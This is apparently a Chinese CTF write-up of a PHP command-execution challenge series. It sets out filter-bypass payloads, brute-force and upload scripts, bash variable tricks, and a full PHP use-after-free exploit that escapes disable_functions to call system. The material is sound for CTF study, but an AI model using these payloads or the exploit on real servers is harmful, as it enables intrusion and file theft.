fl*&quot;);?&gt;.php，所以后缀并不会影响代码的执行\n\n命令执行，需要严格的过滤\n\n好家伙，直接来个狠的。\n题目来源于GXYCTF的禁止套娃\n注意的一个细节在于过滤的基本都是符号，并且括号是中文括号，英文括号依然可以使用，同时也没过滤分号。所以一些函数还是可以使用的，这道题考察的就是如何去拼接组合这些函数来构建一个命令执行语句\n一些可以使用的备选函数\ngetallheaders()：返回所有的HTTP头信息，返回的是数组而eval要求为字符串，所以要用implode()函数将数组转换为字符串get_defined_vars()：该函数的作用是获取所有的已定义变量，返回值也是数组，不过是二维数组，用var_dump()输出可以看见输出的内容，看见在第几位之后，可以用current()函数来获取其值，详细可以看官方函数。payload：var_dump(current(get_defined_vars()));session_id()：session_id()可以用来获取/设置当前会话 ID，可以用这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。    如可以在cookie中设置 PHPSESSID=706870696e666f28293b，然后用hex2bin()函数，    即传入?exp=eval(hex2bin(session_id(session_start())));         并设置cookie：PHPSESSID=706870696e666f28293b    session_start 函数是为了开启session    配合使用的函数：\tprint_r(scandir(‘.’)); 查看当前目录下的所有文件名  var_dump()\tlocaleconv() 函数返回一包含本地数字及货币格式信息的数组。\tcurrent() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名\teach() 返回数组中当前的键/值对并将数组指针向前移动一步\tend() 将数组的内部指针指向最后一个单元\tnext() 将数组中的内部指针向前移动一位\tprev() 将数组中的内部指针倒回一位\tarray_reverse() 以相反的元素顺序返回数组\n思路一：\n\n先扫描当前目录所有文件\n原始payload：var_dump(scandir(&#39;.&#39;))\n由于点号被过滤，我们可以利用localeconv()返回数组中的点号元素\nc=var_dump(scandir(current(localeconv())))\n\n可以看到flag.php位于倒数第二个元素，接下来就是用到数组操纵元素来定位到flag.php。通过highlight_file或show_source（两者一样）来显示出来\nc=show_source(next(array_reverse(scandir(current(localeconv())))));\n\n\n思路二：\n\n通过cookie中的seesionid值来进行命令执行，首先需要开启session。其次可控输入session。最后获取sessionid进行命令执行\nc=session_start();system(session_id());PHPSESSID=ls\n\n不过PHPSESSID的值符号组成有限制\n\n\n\n\n过滤不严，命令执行\n\n\n\n这里关键是过滤了所有的数字和字母（但是这里的数字指的是ascii码48-57的）,所以url编码的那种是可以通过过滤的，也就是没法使用正常的函数了。并且也不能用异或、取反、自增操作\n这题主要利用到的是|或运算符以及括号，我们可以利用穷举脚本，来通过或运算获得我们想要的字符\n# coding=gbkimport reimport requestsurl = &quot;http://829e7146-c785-4947-933d-53f8953b6f17.challenge.ctf.show/&quot;useful = []# 先筛一遍所有可用字符  for i in range(256):    ch = chr(i)    bool = re.match(r&#x27;[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-&#x27;, ch, re.I)    if bool:        continue    else:        useful.append(i)left = &quot;&quot;right = &quot;&quot;def find_k(ch):    global left    global right    for i in useful:        for j in useful:            if((i | j) == ord(ch)):                left += chr(i)                right += chr(j)                return# 构造命令执行语句arg1 = &quot;system&quot;arg2 = &quot;cat fla*&quot;for ch in arg1:    find_k(ch)data1 = &quot;(\\&quot;&quot; + left + &quot;\\&quot;|\\&quot;&quot; + right + &quot;\\&quot;)&quot;left = &quot;&quot;right = &quot;&quot;for ch in arg2:    find_k(ch)data2 = &quot;(\\&quot;&quot; + left + &quot;\\&quot;|\\&quot;&quot; + right + &quot;\\&quot;)&quot;data = &#123;    &quot;c&quot;: data1 + data2&#125;print(data)r = requests.post(url, data)print(r.text)\n\n命令执行，需要严格的过滤\n题面如图\n\n有个拼接操作，/dev/null是什么？\n在类Unix系统中,/dev/null,或称空设备,是一个特殊的设备文件,它丢弃一切写入其中的数据(但报告写入操作成功)0   标准输入1   标准输出2   错误输出\n那么&gt; &amp; 1 2这些组合起来又是啥？\n2&gt;/dev/null   把错误输出到空设备（即丢弃）&gt;/dev/null 2&gt;&amp;1   相当于1&gt;/dev/null 2&gt;&amp;1   即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备2&gt;&amp;1 &gt;/dev/null   错误输出到标准输出，即输出到屏幕上，而标准输出被丢弃something interesting: 重定向&gt; 和 &gt;&gt;   前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部.\n这里主要考查的是管道分割符一类的运用。我们的需求就是由于输出会被丢弃无法回显，所以我们不能让后面这些语句执行\n思路一：%0a截断也就是使两条语句不在一行上执行c=ls%0a思路二：管道符的运用| 直接执行后面的语句|| 如果前面执行的语句出错，则执行后面的语句&amp; 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假&amp;&amp; 如果前面的语句为假则直接出错，不执行后面的语句; 执行完前面的再执行后面的c=ls || \n\n\n\n\n命令执行，需要严格的过滤\n可以看到，过滤了cat和;\n上面总结的继续用\n\n\n命令执行，需要严格的过滤\n多了个flag，不影响！\n\n\n命令执行，需要严格的过滤\n过滤了空格\n再复习一下一些trick\n$&#123;IFS&#125; 但不能写作 $IFS$IFS$9%09&lt;&gt;&lt;$IFS%09payload:c=tac%09fl*||\n\n\n&lt;img src=&quot;/image-20220915145105110.png&quot; alt=&quot;image-20220915145105110&quot; style=&quot;zoom:50%;&quot; /&gt;\n\n命令执行，需要严格的过滤\n这回过滤了* $ 数字，还是可以基于上面绕过滴\n\nc=tac&lt;fl&#x27;&#x27;ag.php||\n\n命令执行，需要严格的过滤\n这回是针对查看文件的命令的过滤，没啥影响\n\n\n\n48-49. 命令执行，需要严格的过滤\n\npayload1:c=nl%09fla\\g.php||\npayload2:c=nl%09fla\\g.php%0a\npayload3:c=nl%09fla&#39;&#39;g.php%0a\npayload4:c=nl%09fla&quot;&quot;g.php%0a\npayload5:c=vi%09fla\\g.php%0a\npayload6:c=tac%09fla\\g.php%0a\npayload7:c=uniq%09fla\\g.php%0a\npayload8:c=nl&lt;fla&#39;&#39;g.php||\npayload9:c=nl%09fla\\g.php%26\n\n命令执行，需要严格的过滤\n\n多过滤了\\x09 \\x26\n继续\n\n命令执行，需要严格的过滤\n哦吼，终于把tac给过滤了，可惜还有vi和nl\n\nc=vi&lt;fla\\g.php||\n\n命令执行，需要严格的过滤\n这关把尖括号给ban了，但是注意这关没$，这不故意的嘛\n\n\n\nc=nl$&#123;IFS&#125;fl&#x27;&#x27;ag.php||\n然而是个假的flag，稍微找一下就知道在根目录了\n\n命令执行，需要严格的过滤\n这关更换题面了，过滤的情况没啥变化\n\n\n\nls，可以看到如下几个文件，花里胡哨的整这么多文件，其实还是读flag.php\n\n\n某位牛出的题\n这可太秀了，相当于不能出现这些关键词序列了，可以看到里面也有nl了，不过还有其它的可以用，至于flag，占位符可以用\nif(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;\n引入两个新的输出文件信息的命令\npaste merge corresponding or subsequent lines of filesrev reverse lines of a file\n\n命令执行，需要严格的过滤\n这波平平无奇了属于是，直接ban掉所有字母\n\n新姿势新姿势\n\n\nbin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/lsbase64命令 Encode and decode using Base64 representation\n就是我们由于存在环境变量，所以一般命令的输入写简写就可以，但其实全路径(mac的base64命令所在目录有区别)是这样的，而我们可以使用占位符来替换掉所有字母部分的内容来加一绕过（这里的trick主要就是利用了base64命令包含数字所以可以被匹配到）\n\npayload\nc=/???/????64 ????.???\n\n命令执行，需要严格的过滤 php特性以及shell命令执行\n直接ban掉了所有数字和字母，以及$和(这些经典trick的利用符\n\n\n\n根据P神的无数字无字母getshell，可以结合上传临时文件与shell文件命令执行来绕过\nimport requestsurl = &quot;http://240d04e7-6751-459f-8e10-2cef8ed0e801.challenge.ctf.show/?c=. /???/????????[@-[]&quot;files = &#123;    &quot;files&quot;: (&quot;evil.txt&quot;, &quot;cat flag.php&quot;)&#125;while True:    r = requests.post(url, files=files)    if &quot;ctfshow&quot; in r.text:        print(r.text)        break\n\n命令执行，需要严格的过滤 shell的小trick\n我超了，过滤的更多了，这一关点号、中括号、短横、通配符也用不了了。但是这关给我们留了$符号和括号，并且题面已经帮我们写好了cat和.php，想让我们构造出数字出来\n\n这里运用到了shell的一些骚姿势\n$(()) 代表做一次运算，因为里面为空，也表示值为0$((~$(()))) 对0作取反运算，值为-1$(($((~$(())))$((~$(()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2$((~$(($((~$(())))$((~$(()))))))) 再对-2做一次取反得到1，所以值为1如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1\n所以要构造出36，我们就得先构造-37\npayload1 = &quot;$((&quot; + &quot;$((~$(())))&quot;*37 + &quot;))&quot;\n\n然后再对其进行取反\npayload2 = &quot;$((~&quot; + payload1 + &quot;))&quot;\n\npayload\nc=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\n\n命令执行，突破禁用函数\n表面上看上去平平无奇可以直接蚁剑连上去\n\n不过考点应该不是这么搞，试一试手动的方法\n\n这题主要是换成了一个代码执行函数eval\n\n首先尝试执行命令执行类函数c=echo &#39;ls&#39;(反斜杠)，结果报错\nshell_exec() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1\n类似的还有system， 也就是命令执行类函数都被禁了\n所以函数的思路转换为读文件一类\n常用读文件函数highlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);// file — 把整个文件读入一个数组中print_r(file($filename)); var_dump(file($filename));include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码// fopen去读取文件内容fread(fopen($filename,&quot;r&quot;), $size);print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组\n\n命令执行，突破禁用函数\n题面一致，本来想查下phpinfo()看看禁用了哪些函数，结果phpinfo都给我禁了…\n先查下当前目录文件\nc=print_r(scandir(&#x27;.&#x27;));c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )\n然后读取函数，新姿势(其实跟之前的差不多，之前的只能读取一部分)\nc=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);\n\n命令执行，突破禁用函数\n题面一致\n有个骚姿势，理论上我们是可以直接url访问flag.php的，但是因为php文件被代码执行了，我们是看不到内容的，一个思路就是复制(或者重命名)并更换文件名为不被当作代码解析的后缀名，即\ncopy(&quot;flag.php&quot;,&quot;flag.txt&quot;);  // 将文件从 source 拷贝到 dest或rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);  // 尝试把 oldname 重命名为 newname\n\n\n61-65. 命令执行，突破禁用函数\n题面一致，payload可以一直用c=show_source(&#39;flag.php&#39;);\n\n命令执行，突破禁用函数，求你们别秀了\n题面一致，终于\nshow_source() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1\n然而它的同胞highlight_file还健在…，话说php为啥整这么多别名函数\n有个特别的就是flag.php上的是个假的，需要重新扫一下目录，flag在根目录\n\n命令执行，突破禁用函数，求你们别秀了\n题面一致，过滤掉了print_r()，它的类似功能函数是var_dump\n扫描目录\nc=var_dump(scandir(&#x27;/&#x27;));\n扫出flag.txt\n直接文件包含即可\nc=include(&#x27;/flag.txt&#x27;);\n\n命令执行，突破禁用函数，求你们别秀了\n题面直接报错，不过应该还是之前的结构\nWarning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19\naz，自己ban自己？\n还是上一题payload\n\n命令执行，突破禁用函数，求你们别秀了\n题面与上一题一致\nvar_dump()也给过滤了\n这里该列一下读取目录的一些方式了\nprint_r(glob(&quot;*&quot;)); // 列当前目录print_r(glob(&quot;/*&quot;)); // 列根目录print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\\n&quot;;&#125;$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;// 后面几个其实主要用到echo 可以输出这个目录条目的特点\n然后依然文件包含即可\n\n命令执行，突破禁用函数，求你们别秀了\n我去题面本身禁用的函数更多了，不过不影响payload\nWarning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 21你要上天吗？\n\n命令执行，突破禁用函数，求你们别秀了\n题面一致，这次给了题面源码，审一波\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123;        $c= $_POST[&#x27;c&#x27;];        eval($c);        $s = ob_get_contents();\t// 返回输出缓冲区的内容        ob_end_clean();\t// 清空（擦除）缓冲区并关闭输出缓冲        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\nob_get_contents()会截获缓冲区的内容，并且通过正则替换，所有字符串中的数字和字母将被替换为?\n针对ob_end_clean()，官网提到此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。。也就是说，一切祸源于ob_end_clean()，也就是说我们想要阻止该函数关闭缓冲区，提前退出程序不就行了！\nc=include(&quot;/flag.txt&quot;);exit();\n\n命令执行，突破禁用函数，求你们别秀了 突破open_basedir限制\n题面一致，依然给了代码\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123;        $c= $_POST[&#x27;c&#x27;];        eval($c);        $s = ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n看起来和上一题没啥变化，应该就是在过滤函数上增加了\n先扫目录，先尝试上一题的payload\n$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\\n&quot;;&#125;-----------------------------------------------------------------------------------疯狂报Warning: readdir() expects parameter 1 to be resource, bool given in /var/www/html/index.php(19) : eval()&#x27;d code on line 1\n换payload，根目录下存在flag0.txt\n$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit;flag0.txt\n尝试直接包含，报错\nWarning: include(flag0.txt): failed to open stream: No such file or directory in /var/www/html/index.php(19) : eval()&#x27;d code on line 1Warning: include(): Failed opening &#x27;flag0.txt&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php(19) : eval()&#x27;d code on line 1\n原来是有open_basedir的限制\nopen_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开\n学习P神14年的研究（666）\n原来php5.3之后有了DirectoryIterator这个类方便直接去遍历目录，且可以无视open_basedir的限制\n不过后面命令执行就不清楚了，直接脚本小子…（据说是uaf堆漏洞\nfunction ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;        die(&#x27;This PoC is for *nix systems only.&#x27;);    &#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);    trigger_uaf(&#x27;x&#x27;);    $abc = $backtrace[1][&#x27;args&#x27;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#x27;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#x27;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#x27;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#x27;t get zif_system address&quot;);    &#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();exit;\n\n命令执行，突破禁用函数\n还是上一关的payload扫目录，根目录发现flagc.txt\n那就直接试试文件包含\nc=include(&#x27;/flagc.txt&#x27;);exit;\n\n命令执行，突破禁用函数\npayload扫目录，根目录flagx.txt\n可以继续打\n\n命令执行，突破禁用函数 mysql读写\npayload扫目录，根目录flag36.txt\ninclude和require都不能用了，应该还是open_basedir的限制，但这关的漏洞点不在堆漏洞了，因为过滤了strlen关键字，而在mysql可以读写漏洞\n\npayload 这题有点离谱了，数据库的用户信息是咋知道的？\ntry &#123;  $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);  foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;    echo($row[0]).&quot;|&quot;;   &#125;  $dbh = null;&#125;catch (PDOException $e) &#123;  echo $e-&gt;getMessage();  exit(0);&#125;exit(0);\n即便不知道数据库名为ctftraining，也可以通过连接默认数据库information_schema达到命令执行的目录，只需要猜解出mysql的用户名和密码即可\n$dsn = &quot;mysql:host=localhost;dbname=information_schema&quot;;$db = new PDO($dsn, &#x27;root&#x27;, &#x27;root&#x27;);$rs = $db-&gt;query(&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;);foreach($rs as $row)&#123;        echo($row[0]).&quot;|&quot;; &#125;exit();// 获取所有数据库  select schema_name from information_schema.schemata;\n这里可以先读出所有的库模式\n\n$dsn = &quot;mysql:host=localhost;dbname=ctftraining&quot;;$db = new PDO($dsn, &#x27;root&#x27;, &#x27;root&#x27;);$rs = $db-&gt;query(&quot;select load_file(&#x27;/flag36.txt&#x27;)&quot;);foreach($rs as $row)&#123;        echo($row[0]).&quot;|&quot;; &#125;exit();\n\n命令执行，突破禁用函数\n先查下目录，根目录出现flag36d.txt，payload未变\n\n命令执行最后一题，php7.4，基本上命令执行就告一段落了 FF1拓展\n读目录，出现两个可疑文件\n\n\n\n​    我们先尝试利用之前的payload读取flag36x.txt，但是PDO连接失败\ncould not find driver in /var/www/html/index.php(19) \n题目提示了php 7.4，所以可以去查一下这个版本的新特性FFI：外部函数接口特性\npublic static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null): FFI\n\n其中$code为一个字符串，包含常规C语言中的一系列声明，$lib为要加载和链接的共享库文件名称，如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号。\n也就是说我们可以调用C语言代码来执行，C语言中存在命令执行函数system\nint system(const char *command) // 返回命令执行的状态\npayload\n$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$a = &quot;/readflag &gt; 1.txt&quot;;$ffi-&gt;system($a);exit;\n然后访问1.txt即可\n\nflag in flag.php\n源代码中有提示&lt;!-- system($code);--&gt;\n简单测试发现只有大写字母和&#123;&#125;$?*.空格;这些可以使用\n所以这题的思路是使用bash的内置变量构造系统函数\n$USER // 用户名$PATH // 可执行文件的搜索路径。 这里可以利用一下，因为所有文件都以n结尾，我们可以构造出nl命令-&gt; $&#123;PATH:~A&#125;$PWD //\t工作目录(你当前所在的目录)，这与内置命令 pwd 的作用相同// 字符串截取操作$&#123;string: start :length&#125; //左边开始，从0开始计数$&#123;string: 0-start :length&#125; // 从右边开始计数$&#123;string: ~0&#125; // 截取最后一个字符/一组字符串$&#123;string: ~A&#125;\n根据提示flag.php应该在当前目录/var/www/html，文件用通配符\n$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???\n这样也可以截取最后一个字符\n\n\n执行代码没有变，发现PATH关键字被禁了，我们只能换其它内置变量\n引入一个新的内置变量$&#123;SHLVL&#125;\nSHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。\n\n南神的思路就是构造/bin/cat命令\n$# 位置参数的个数 一般读函数就是0构造 /bin/cat针对/- $&#123;PWD:$#:$SHLVL&#125;针对bin 直接使用通配符???- $&#123;PWD:$#:$SHLVL&#125;???所以可以构造出/bin/- $&#123;PWD:$#:$SHLVL&#125;???$&#123;PWD:$#:$SHLVL&#125;cat中的at 因为一般权限用户为www-data 所以我们想截取倒数第三位和倒数第二位也就是 $&#123;USER:~2:2&#125;所以还需要构造2这个数字这里比较巧妙的就是正好利用了靶机的PHP版本号最后一位是2所以2的payload就是- $&#123;PHP_VERSION:~A&#125;结合起来就是- $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???\n\n\n\n这题给出了源代码\n&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#x27;code&#x27;]))&#123;    $code=$_POST[&#x27;code&#x27;];    if(!preg_match(&#x27;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#x27;|\\&quot;|\\`|\\||\\,/&#x27;, $code))&#123;            if(strlen($code)&gt;65)&#123;            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;        &#125;        else&#123;        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;        &#125;    &#125;    else&#123;     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;    &#125;&#125;?&gt;\n这题过滤了空格，并且限制了payload长度不能超过65。针对上一题的payload可以进行一定的缩减\ncat关键字我们只出一个a，其它用通配符替换\n// www-data 